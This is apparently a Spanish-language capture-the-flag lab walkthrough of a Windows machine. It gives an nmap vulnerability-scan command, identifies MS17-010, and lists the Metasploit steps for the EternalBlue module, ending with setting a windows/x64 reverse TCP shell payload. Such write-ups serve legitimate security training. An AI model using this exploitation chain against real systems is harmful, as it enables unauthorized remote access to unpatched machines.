## Reconocimiento

Escanea la máquina. (Si no está seguro de cómo abordar esto, le recomiendo que visite la sala de Nmap )
¿Cuántos puertos están abiertos con un número de puerto inferior a 1000?

    Command: nmap -sV -vv --script vuln TARGET_IP
    Solo 3 puertos son de los inferiores a  1000 el resto es superior


¿A qué es vulnerable esta máquina? (Respuesta en forma de: ms ?? - ???, ex: ms08-067)
 
    ms17-010

## Acceder

Iniciar Metasploit

	msfconsole
 
Encuentra el código de explotación que ejecutaremos contra la máquina. ¿Cuál es la ruta completa del código? (Ej: explotar / ........)

	Search eternalblue
 
    exploit/windows/smb/ms17_010_eternalblue

Muestre opciones y establezca el valor requerido. ¿Cuál es el nombre de este valor? (Todo en mayúsculas para la presentación)
Show options
 
    RHOSTS

Por lo general, estaría bien ejecutar este exploit como está; sin embargo, por el bien de aprender, debe hacer una cosa más antes de explotar el objetivo. Ingrese el siguiente comando y presione enter:

    set payload windows/x64/shell/reverse_tcp
